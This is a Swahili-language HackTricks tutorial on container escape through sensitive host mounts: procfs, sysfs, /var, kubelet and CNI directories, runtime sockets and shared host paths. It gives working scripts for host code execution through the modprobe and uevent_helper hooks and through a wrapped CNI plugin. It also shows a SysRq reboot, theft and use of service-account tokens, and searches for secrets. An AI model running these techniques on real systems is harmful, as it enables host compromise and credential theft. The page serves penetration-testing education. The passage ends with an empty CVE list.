# Mounts Nyeti za Host

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Mounts za host ni mojawapo ya sehemu muhimu zaidi za vitendo za kutorokea container, kwa sababu mara nyingi hubatilisha utenganishaji makini wa mwonekano wa mchakato na kuufanya uone rasilimali za host moja kwa moja. Hali hatari haziishii kwenye `/`. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, hali inayosimamiwa na kubelet, au njia zinazohusiana na vifaa zinaweza kufichua vidhibiti vya kernel, vitambulisho, mifumo ya faili ya containers jirani na violesura vya usimamizi wa runtime.

Ukurasa huu upo kando ya kurasa mahususi za ulinzi kwa sababu modeli ya matumizi mabaya inahusisha maeneo mengi. Mount ya host inayoweza kuandikwa ni hatari kwa sababu ya mount namespaces, user namespaces, ufunikaji wa AppArmor au SELinux, na njia halisi ya host iliyofichuliwa. Kuichukulia kama mada yake yenyewe hurahisisha zaidi kuchanganua sehemu zinazoweza kushambuliwa.

Pia linganisha saraka ya host inayoweza kuandikwa na njia inayolingana ndani ya kila container. Ikiwa imewekwa juu ya saraka ya scripts zinazotekelezwa wakati wa kuwasha, mtumiaji wa host mwenye ruhusa ndogo anaweza kuweka code ambayo entrypoint ya container yenye ruhusa kubwa itapakia itakapowashwa upya. Thibitisha chanzo na lengwa halisi la bind, ruhusa za kuandika/kutafuta za saraka, mzunguko wa entrypoint na sharti la faili kutekelezeka, runtime UID, na kichocheo halisi cha kuwasha upya. Container UID 0 haimaanishi moja kwa moja host UID 0; ulinganifu wa user namespace na sera ya mount ndivyo huamua athari kwa host. Ukaguzi usiofanya mabadiliko unapaswa kuripoti njia na ruhusa bila kuandika script au kuwasha upya workload.

Container ya Linux inaweza kuwa ndani ya management VM inayoshiriki sehemu ya mfumo tofauti wa faili wa host ya Windows. [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) ni njia mojawapo ya kufanya faili za host zionekane ndani ya guest, lakini root ndani ya VM hiyo bado ni utambulisho tofauti na msimamizi wa Windows. Ikiwa share inafichua private key ya SSH inayosomeka ya mtumiaji, ichukulie kama kidokezo cha credential: thibitisha mount halisi inayotegemea host, umiliki na ufikiaji wa key, akaunti inayolingana, na sera **inayotumika** ya authorized keys ya seva ya Windows SSH kabla ya kuhitimisha kuwa inaruhusu kuingia kwenye host. Windows OpenSSH ya kisasa [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) mara nyingi hutumia faili tofauti ya `administrators_authorized_keys` kwa akaunti za wasimamizi. Usijumuishe maudhui ya private key kwenye matokeo ya kawaida ya uhesabuji; metadata ya mount na njia ya key vinatosha kwa uchunguzi wa awali usiofanya mabadiliko.

## Kufichuliwa kwa `/proc`

procfs ina taarifa za kawaida za michakato na violesura vya udhibiti wa kernel vyenye athari kubwa. Kwa hiyo, bind mount kama `-v /proc:/host/proc` au mwonekano wa container unaofichua bila kutarajiwa maingizo ya proc yanayoweza kuandikwa unaweza kusababisha kufichuliwa kwa taarifa, kunyimwa huduma, au kutekelezwa kwa code moja kwa moja kwenye host.

Njia muhimu zenye thamani kubwa katika procfs ni pamoja na:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (hasa `register` na `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Matumizi Mabaya

Anza kwa kuangalia ni maingizo gani muhimu yenye thamani kubwa katika procfs yanayoonekana au yanayoweza kuandikwa:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Njia hizi zinavutia kwa sababu tofauti. `core_pattern`, `modprobe`, na `binfmt_misc` zinaweza kuwa njia za kutekeleza code kwenye host zinapoandikika. `kallsyms`, `kmsg`, `kcore`, na `config.gz` ni vyanzo muhimu vya reconnaissance kwa ajili ya kernel exploitation. `sched_debug` na `mountinfo` hufichua muktadha wa process, cgroup, na filesystem ambao unaweza kusaidia kubaini mpangilio wa host ukiwa ndani ya container.

Umuhimu wa kiutendaji wa kila njia unatofautiana, na kuzichukulia kana kwamba zote zina athari sawa hufanya triage kuwa ngumu zaidi:

- `/proc/sys/kernel/core_pattern`
  Ikiwa inaweza kuandikika, hii ni mojawapo ya njia za procfs zenye athari kubwa zaidi kwa sababu kernel itatekeleza pipe handler baada ya crash. Container inayoweza kuelekeza `core_pattern` kwenye payload iliyo kwenye overlay yake au kwenye njia iliyomountiwa kutoka host mara nyingi inaweza kupata uwezo wa kutekeleza code kwenye host. Tazama pia [read-only-paths.md](protections/read-only-paths.md) kwa mfano maalum.
- `/proc/sys/kernel/modprobe`
  Njia hii hudhibiti helper ya userspace inayotumiwa na kernel inapohitaji kuita logic ya kupakia module. Ikiwa inaweza kuandikika kutoka ndani ya container na kutafsiriwa katika muktadha wa host, inaweza kuwa primitive nyingine ya kutekeleza code kwenye host. Inavutia hasa ikiunganishwa na njia ya kuchochea helper.
- `/proc/sys/vm/panic_on_oom`
  Kwa kawaida hii si primitive safi ya escape, lakini inaweza kugeuza shinikizo la memory kuwa denial of service ya host nzima kwa kubadilisha hali ya OOM kuwa tabia ya kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Ikiwa kiolesura cha usajili kinaweza kuandikika, mshambuliaji anaweza kusajili handler kwa magic value aliyochagua na kupata utekelezaji katika muktadha wa host faili inayolingana inapotekelezwa.
- `/proc/config.gz`
  Ni muhimu kwa triage ya kernel exploit. Husaidia kubaini ni subsystems, mitigations, na vipengele vya hiari vya kernel vilivyowezeshwa bila kuhitaji metadata ya package ya host.
- `/proc/sysrq-trigger`
  Mara nyingi hutumika kusababisha denial of service, lakini ni njia hatari sana. Inaweza kuwasha upya, kusababisha panic, au kuvuruga host mara moja kwa njia nyingine.
- `/proc/kmsg`
  Hufichua ujumbe wa kernel ring buffer. Ni muhimu kwa host fingerprinting, uchanganuzi wa crash, na katika baadhi ya mazingira kwa kuvuja kwa taarifa zinazosaidia kernel exploitation.
- `/proc/kallsyms`
  Ni muhimu inapoweza kusomeka kwa sababu hufichua taarifa za kernel symbols zilizotolewa nje na inaweza kusaidia kushinda dhana za address randomization wakati wa kuendeleza kernel exploit.
- `/proc/[pid]/mem`
  Hii ni kiolesura cha moja kwa moja cha memory ya process. Ikiwa process lengwa inaweza kufikiwa kwa masharti yanayohitajika ya aina ya ptrace, inaweza kuruhusu kusoma au kurekebisha memory ya process nyingine. Athari halisi hutegemea sana credentials, `hidepid`, Yama, na vizuizi vya ptrace, kwa hiyo ni njia yenye nguvu lakini yenye masharti.
- `/proc/kcore`
  Hufichua mwonekano wa memory ya mfumo unaofanana na core image. Faili ni kubwa na si rahisi kutumia, lakini ikiwa inaweza kusomeka kwa kiwango cha maana, inaashiria kuwa sehemu ya memory ya host imefichuliwa vibaya.
- `/dev/kmem` na `/dev/mem`
  Hizi ni violesura vya kihistoria vya kifaa cha raw-memory vyenye athari kubwa, si faili za procfs. Katika mifumo mingi ya kisasa hazipo au zimewekewa vizuizi vikali, lakini container inayoweza kufungua nakala iliyomountiwa kutoka host inapaswa kuchukulia ufichuaji huo kuwa hatari kubwa. Zikague pamoja na mount nyingine nyeti za `/dev` badala ya kutafuta njia zisizokuwepo za `/proc/kmem` au `/proc/mem`.
- `/proc/sched_debug`
  Huvujisha taarifa za scheduling na task zinazoweza kufichua utambulisho wa process za host hata kama mwonekano mwingine wa process unaonekana safi kuliko ilivyotarajiwa.
- `/proc/[pid]/mountinfo`
  Ni muhimu sana kwa kubaini mahali container ilipo hasa kwenye host, njia zipi zinatumia overlay, na ikiwa mount inayoweza kuandikika inalingana na maudhui ya host au ni layer ya container pekee.

Ikiwa `/proc/[pid]/mountinfo` au maelezo ya overlay yanaweza kusomeka, yatumie kubaini njia ya host ya filesystem ya container:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Amri hizi zina manufaa kwa sababu mbinu kadhaa za kutekeleza amri kwenye host zinahitaji kubadilisha njia iliyo ndani ya container kuwa njia inayolingana kwa mtazamo wa host.

### Mfano: Kuandaa Njia ya Helper ya `modprobe`

Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka ndani ya container na njia ya helper inatafsiriwa katika muktadha wa host, inaweza kuelekezwa kwenye payload inayodhibitiwa na mshambuliaji. Saraka ya juu ya overlay lazima ipatikane kutoka kwa host, na matokeo ya uthibitisho yaandikwe tena kwenye layer ileile ya container inayoonekana kwa host ikiwa container haijaweka pia host `/tmp`:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Kichochezi halisi hutegemea lengo na tabia ya kernel, na hakikadiriwi kimakusudi. Rejesha thamani ya awali kabla ya kuondoka kwenye lab. Jambo muhimu ni kwamba njia saidizi inayoweza kuandikiwa inaweza kuelekeza uombaji wa baadaye wa kernel helper kwenye maudhui ya njia ya host yanayodhibitiwa na mshambuliaji. `upperdir` ya overlay isiyokuwepo, njia ambayo host haiwezi kutatua, mount ya sysctl ya kusoma tu, au kernel ambayo haiombi helper iliyochaguliwa huvunja mnyororo huu.

### Mfano Kamili: Kernel Recon Kwa Kutumia `kallsyms`, `kmsg`, Na `config.gz`

Ikiwa lengo ni kutathmini uwezekano wa kutekelezeka badala ya kutoroka mara moja:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Amri hizi husaidia kubaini ikiwa taarifa muhimu za symbol zinaonekana, ikiwa ujumbe wa hivi karibuni wa kernel unaonyesha hali ya kuvutia, na vipengele au mitigations gani za kernel zimejumuishwa. Athari kwa kawaida si kutoroka moja kwa moja, lakini zinaweza kupunguza sana muda wa kuchunguza udhaifu wa kernel.

### Mfano Kamili: Kuwasha Upya Host kupitia SysRq

Ikiwa `/proc/sysrq-trigger` inaweza kuandikwa na kufikia mwonekano wa host:

```bash
echo b > /proc/sysrq-trigger
```

Athari yake ni kuwasha upya host mara moja. Huu si mfano wa hila, lakini unaonyesha wazi kwamba kufichuliwa kwa procfs kunaweza kuwa hatari zaidi sana kuliko kufichua taarifa tu.

## `/sys` Exposure

sysfs hufichua kiasi kikubwa cha hali ya kernel na vifaa. Baadhi ya njia za sysfs zinafaa zaidi kwa fingerprinting, huku nyingine zikiweza kuathiri utekelezaji wa helper, tabia ya kifaa, usanidi wa security-module, au hali ya firmware.

Njia muhimu za sysfs ni pamoja na:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Njia hizi ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri tabia ya usimamizi wa joto na hivyo uthabiti wa host katika mazingira yenye udhibiti dhaifu wa ufikiaji. `/sys/kernel/vmcoreinfo` inaweza kuvuja taarifa za crash-dump na mpangilio wa kernel zinazosaidia katika fingerprinting ya kiwango cha chini cha host. `/sys/kernel/security` ni kiolesura cha `securityfs` kinachotumiwa na Linux Security Modules, kwa hivyo ufikiaji usiotarajiwa unaweza kufichua au kubadilisha hali inayohusiana na MAC. Njia za vigezo vya EFI zinaweza kuathiri mipangilio ya kuwasha mfumo inayohifadhiwa kwenye firmware, jambo linalozifanya kuwa hatari zaidi kuliko faili za kawaida za usanidi. `debugfs` iliyo chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu imekusudiwa kuwa kiolesura cha wasanidi programu, chenye matarajio machache zaidi ya usalama kuliko API za kernel zilizofanywa kuwa imara kwa matumizi ya uzalishaji.

Kila ingizo la sysfs katika orodha hii **hutegemea kernel, usanidi na maunzi**. Node za sasa za mazingira yaliyovirtualishwa mara nyingi hazijumuishi kabisa `uevent_helper`, vigezo vya EFI na maingizo ya vifaa vya thermal. Rekodi njia ambayo haipo kama sharti la awali lisilotimizwa badala ya kudhani kwamba mfano kutoka kernel nyingine unatumika.

Amri muhimu za kukagua njia hizi ni:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Ni nini kinachofanya amri hizo zivutie:

- `/sys/kernel/security` inaweza kufichua kama AppArmor, SELinux, au LSM nyingine inaonekana kwa namna ambayo ilipaswa kubaki kwenye host pekee.
- `/sys/kernel/debug` mara nyingi ndilo jambo linalotia wasiwasi zaidi katika kundi hili. Ikiwa `debugfs` imewekwa na inaweza kusomwa au kuandikwa, tarajia eneo pana linaloelekeza kwenye kernel, ambalo hatari yake halisi hutegemea nodi za debug zilizowezeshwa.
- Kufichuliwa kwa vigezo vya EFI si jambo la kawaida sana, lakini kukitokea kuna athari kubwa kwa sababu kunahusu mipangilio inayotegemea firmware badala ya faili za kawaida za wakati wa utekelezaji.
- `/sys/class/thermal` inahusu zaidi uthabiti wa host na mwingiliano na maunzi, wala si njia rahisi ya kutoroka kwa mtindo wa shell.
- `/sys/kernel/vmcoreinfo` hutumika zaidi kutambua host na kuchanganua hitilafu, na husaidia kuelewa hali ya chini ya kernel.

### Mfano Kamili: `uevent_helper`

`/sys/kernel/uevent_helper` hutegemea kernel na usanidi, na haipo kwenye mifumo mingi ya sasa. Ikiwa ipo, inaweza kuandikwa, na kichochezi cha `uevent` kinachoweza kutumika kinapatikana, kernel inaweza kutekeleza helper inayodhibitiwa na mshambulizi. Matokeo ya uthibitisho lazima yatumie njia inayoonekana katika mitazamo ya host na container:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Sababu ya hili kufanya kazi ni kwamba njia ya helper hufasiriwa kwa mtazamo wa host. Inapoanzishwa, helper huendeshwa katika muktadha wa host badala ya ndani ya container ya sasa. `/sys/class/mem/null/uevent` ni kichochezi mahususi kwenye kernels zinazoifichua; vifaa vingine vinaweza kufichua faili zao za `uevent`, lakini usichague moja bila kuchunguza kwenye vifaa halisi. Rejesha thamani ya awali kabla ya kutoka kwenye maabara. Usiripoti mbinu hii kuwa inapatikana ikiwa faili ya helper au kichochezi kinachodhibitiwa hakipo.

## Ufichuaji wa `/var`

Kuweka `/var` ya host ndani ya container mara nyingi hudharauliwa kwa sababu haionekani kuwa hatari kama kuweka `/`. Kwa vitendo, inaweza kutosha kufikia runtime sockets, directories za container snapshot, volumes za pod zinazosimamiwa na kubelet, service-account tokens zilizoprojectiwa, na filesystem za programu zilizo karibu. Kwenye nodes za kisasa, mara nyingi `/var` ndipo hali ya container yenye manufaa zaidi kiutendaji huishi.

### Mfano wa Kubernetes

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma tokens zilizoprojectiwa za pods nyingine na maudhui ya overlay snapshot:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Amri hizi ni muhimu kwa sababu zinaonyesha kama mount inafichua data ya kawaida tu ya programu au credentials za cluster zenye athari kubwa. Token ya service account inayoweza kusomwa inaweza kubadilisha mara moja utekelezaji wa code wa ndani kuwa ufikiaji wa Kubernetes API.

Ikiwa token ipo, thibitisha inachoweza kufikia badala ya kuishia tu kwenye kugundua token:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Athari hapa inaweza kuwa kubwa zaidi kuliko ufikiaji wa node ya ndani. Tokeni yenye RBAC pana inaweza kufanya `/var` iliyowekwa mount isababishe kuathirika kwa cluster nzima.

### Mfano wa Docker na containerd

Kwenye host za Docker, data husika mara nyingi huwa chini ya `/var/lib/docker`, ilhali kwenye node za Kubernetes zinazotumia containerd inaweza kuwa chini ya `/var/lib/containerd` au njia mahususi za snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Ikiwa `/var` iliyowekwa kama mount inaonyesha maudhui ya snapshot yanayoweza kuandikwa ya workload nyingine, mshambuliaji anaweza kubadilisha faili za programu, kuweka maudhui ya wavuti, au kubadilisha startup scripts bila kugusa usanidi wa container ya sasa.

Kwenye **workload ya maabara inayoweza kutupwa**, maudhui ya snapshot yanayoweza kuandikwa yanaweza kuonyesha jinsi ya kuchezea programu, kurejesha siri, au kufanya lateral movement. Kwanza linganisha container ID ya runtime na snapshot husika kabisa, na usihariri kamwe snapshot isiyohusiana au ya production:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Amri hizi ni muhimu kwa sababu zinaonyesha aina kuu tatu za athari za mount ya `/var`: kuchezea programu, kurejesha siri, na kuhamia kwenye workloads zilizo jirani.

Kuandika moja kwa moja kwenye snapshot kunakwepa usimamizi wa kawaida wa state wa runtime na kunaweza kuharibu container au ushahidi. Ugunduzi wa kusoma pekee ulijaribiwa tena kwenye `overlay2` ya Docker: alama iliyoandikwa kwenye container ya muda iliyo jirani ilionekana chini ya `/var/lib/docker/overlay2/<id>/diff/`. Fanya marekebisho halisi ya snapshot kwenye container ya muda tu iliyoundwa kwa jaribio hilo.

## State ya Kubelet, Plugins, na Njia za CNI

Mount ya `/var/lib/kubelet`, `/opt/cni/bin`, au `/etc/cni/net.d` mara nyingi huwekwa wazi kupitia DaemonSets zenye ruhusa za juu, mawakala wa CNI, plugins za CSI za node, waendeshaji wa GPU, na zana za usaidizi wa storage. Ni rahisi kupuuza mount hizi kama "miundombinu ya msingi ya node", lakini ziko moja kwa moja kwenye njia ya utekelezaji wa pods mpya na mara nyingi huwa na credentials za kubelet, secrets zilizowekwa kama projected volumes, sockets za usajili, na binaries za plugin zinazotekelezwa kwenye host.

Malengo yenye thamani kubwa ni pamoja na:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Amri muhimu za ukaguzi ni:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Kwa nini njia hizi ni muhimu:

- `/var/lib/kubelet/pki` inaweza kufichua vyeti vya mteja vya kubelet na vitambulisho vingine vya ndani ya nodi ambavyo wakati mwingine vinaweza kutumiwa tena dhidi ya API server au endpoint za TLS zinazowasiliana na kubelet, kutegemea muundo wa cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` mara nyingi huwa na tokeni za service-account zilizowekwa na Secrets zilizowekwa kwa pods jirani kwenye nodi hiyo hiyo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` hutumika hasa kwa reconnaissance, lakini ni chanzo muhimu sana cha taarifa: hufichua ni pods na containers zipi zinazotumia GPU, hugepages, vifaa vya SR-IOV na rasilimali nyingine adimu za ndani ya nodi kwa sasa.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, na `/var/lib/kubelet/plugins_registry` hufichua ni plugins zipi za CSI, DRA na vifaa zilizosakinishwa, na ni sockets zipi ambazo kubelet inatarajiwa kuwasiliana nazo. Ikiwa saraka hizo zina ruhusa za kuandikwa badala ya kusomwa tu, suala hilo huwa zito zaidi.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` na `/etc/cni/net.d` ziko moja kwa moja kwenye njia ya usanidi wa mtandao wa pod. Ufikiaji wa kuandika humo mara nyingi huwa njia ya kupata utekelezaji kwenye host baadaye, si ufichuaji wa usanidi tu.<sup>[[2]](#references)</sup>

### Mfano Kamili: `/opt/cni/bin` Inayoweza Kuandikwa

Ikiwa saraka ya binary za CNI ya host imewekwa ikiwa na ruhusa za kusoma na kuandika, kubadilisha plugin kunaweza kutosha kupata utekelezaji kwenye host wakati mwingine kubelet itakapounda pod sandbox kwenye nodi hiyo:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Hii si ya haraka kama `docker.sock` iliyowekwa mount, lakini mara nyingi huwa ya uhalisia zaidi katika infrastructure pods za Kubernetes zilizoathiriwa. Alama huandikwa kando ya plugin iliyowekwa mount ili container iweze kuipata hata bila mount ya host-root au host-`/tmp`. Wrapper huhifadhi arguments za awali na standard input, kisha mfano hurejesha binary ya awali. Jambo muhimu ni kwamba binary iliyorekebishwa hutekelezwa baadaye na mtiririko wa usanidi wa mtandao wa host, si na container ya sasa. Tumia node inayoweza kutupwa tu, kwa sababu wrapper isiyo sahihi inaweza kuzuia Pod sandboxes mpya kupata networking.

## Runtime Sockets

Mounts nyeti za host mara nyingi hujumuisha runtime sockets badala ya directories kamili. Hizi ni muhimu sana kiasi kwamba zinastahili kutajwa tena waziwazi hapa:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Tazama [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa mtiririko kamili wa exploitation mara tu mojawapo ya soketi hizi inapowekwa.

Kama muundo wa haraka wa mwingiliano wa kwanza:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Ikiwa mojawapo ya njia hizi itafaulu, njia kutoka kwa "mounted socket" hadi "kuanzisha sibling container yenye ruhusa zaidi" kwa kawaida huwa fupi zaidi kuliko njia yoyote ya kernel breakout.

Ufikiaji huo huo wa daemon unaweza pia kuwezesha **host persistence**. Helper container yenye host-root bind mount inayoweza kuandikiwa inaweza kupokea faili kupitia `docker cp`, kisha kutumia `docker exec` kuweka SSH key, service unit, au faili nyingine ya persistence chini ya njia ya host iliyomountiwa. Mpaka wa usalama ni mamlaka ya daemon ya kuunda host mount; `docker cp` ni hatua ya kuweka faili tu. Kagua containers zilizoundwa hivi karibuni na uandishi kwenye njia za host zinazohusika na uthibitishaji au uanzishaji baada ya runtime socket kufichuliwa.

## Utekaji wa Task kupitia Njia ya Host Inayoweza Kuandikiwa

Host mount inayoweza kuandikiwa haihitaji kufichua `/` ili iwe hatari. Ikiwa njia iliyomountiwa ina scripts, config files, hooks, plugins, au faili zitakazotumiwa baadaye na scheduled task au service ya upande wa host, container inaweza kubadilisha kitakachotekelezwa na host.

Mtiririko wa jumla wa ukaguzi:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Ikiwa faili linaloweza kuandikwa linatumiwa na process ya host, weka payload rahisi na inayoweza kuonekana unapojaribu:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Sehemu muhimu ni mpaka wa uaminifu: uandishi hufanyika kutoka ndani ya kontena, lakini utekelezaji hufanyika baadaye katika muktadha wa huduma ya host. Hii hugeuza hostPath au bind mount finyu kuwa njia ya kuchelewesha utekelezaji wa msimbo kwenye host.

## Faili Zinazomilikiwa na root kwenye Njia ya Pamoja ya Host

Akaunti ya kontena inayoweza kupata root inaweza kuweka faili inayomilikiwa na root kwenye njia inayoweza kuandikwa ambayo pia hutumiwa na host. Ikiwa UID 0 ya kontena inalingana na UID 0 ya host, mitazamo yote miwili hurejelea faili ileile, na mount ya host inaruhusu utekelezaji wa SUID, mtumiaji wa host anayeweza kuendesha executable inayomilikiwa na root na yenye SUID kwenye njia hiyo anaweza kuvuka mpaka wa mamlaka ya host. Kontena halihitaji kuendeshwa kwa `--privileged` ili tatizo hili mahususi la umiliki wa faili litokee. Tazama [mappings za user namespace](protections/namespaces/user-namespace.md) na [majadiliano ya SUID](privileged-containers.md) kwa masharti tofauti.

Kagua njia kutoka **pande zote mbili**: linganisha umiliki na utambulisho wa faili isiyo hatari, angalia `uid_map` na `gid_map` za kontena, na kagua chaguo za mount za host pamoja na sera ya utekelezaji. `rw` upande wa kontena bila `nosuid` ni ishara ya kuhitaji uchunguzi tu; haiwezi kuthibitisha umiliki wa host, flags za mount za host, ufikiaji wa mtumiaji wa host, au iwapo AppArmor/SELinux inazuia utekelezaji. `noexec` huzuia utekelezaji katika mtazamo ambamo inatumika. Tagu za `shared:` na `master:` katika `/proc/self/mountinfo` hueleza usambazaji wa mount, si iwapo maudhui ya faili yanashirikiwa na host. Bind mount inaweza kukosa tagu hizo. Utumiaji upya wa credentials unaowezesha kuingia kwenye host ni hatua tofauti na kuvuka mpaka wa mamlaka kupitia faili ya pamoja.

Hifadhi ya runtime ya host inaweza kuunda njia inayofanana hata bila bind mount iliyowekwa wazi. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) ilimruhusu mtumiaji wa host asiye na mamlaka kupita kwenye subdirectory za data za Docker na kuendesha faili kutoka kwenye filesystem ya kontena; Moby ilirekebisha ruhusa katika 20.10.9 na inabainisha kuwa kontena zinazoendelea kuendeshwa lazima zianzishwe upya ili kurekebisha directory zake. Kagua njia halisi za `overlay2/<id>/merged` zilizomountiwa na ruhusa ya kutafuta kwenye kila directory ya mzazi, kisha thibitisha iwapo UID 0 ya kontena inalingana na UID 0 ya host, iwapo executable halisi inayomilikiwa na root na yenye SetUID ipo na inaweza kufikiwa, na iwapo mtazamo wa host unaruhusu utekelezaji wa SetUID. Kontena za rootless au zilizoremapiwa user namespace, `nosuid`, `noexec`, `no_new_privs`, na sera za MAC zinaweza kubadilisha matokeo. Toleo la runtime au njia inayoweza kupitiwa pekee ni kidokezo cha kuanza ukaguzi, si uthibitisho wa utekelezaji wa host-root; kagua metadata ya mount na faili bila kuendesha executable inayoshukiwa.

## CVE Zinazohusiana na Mount

Mount za host pia huhusiana na udhaifu wa runtime. Mifano muhimu ya hivi karibuni ni pamoja na:

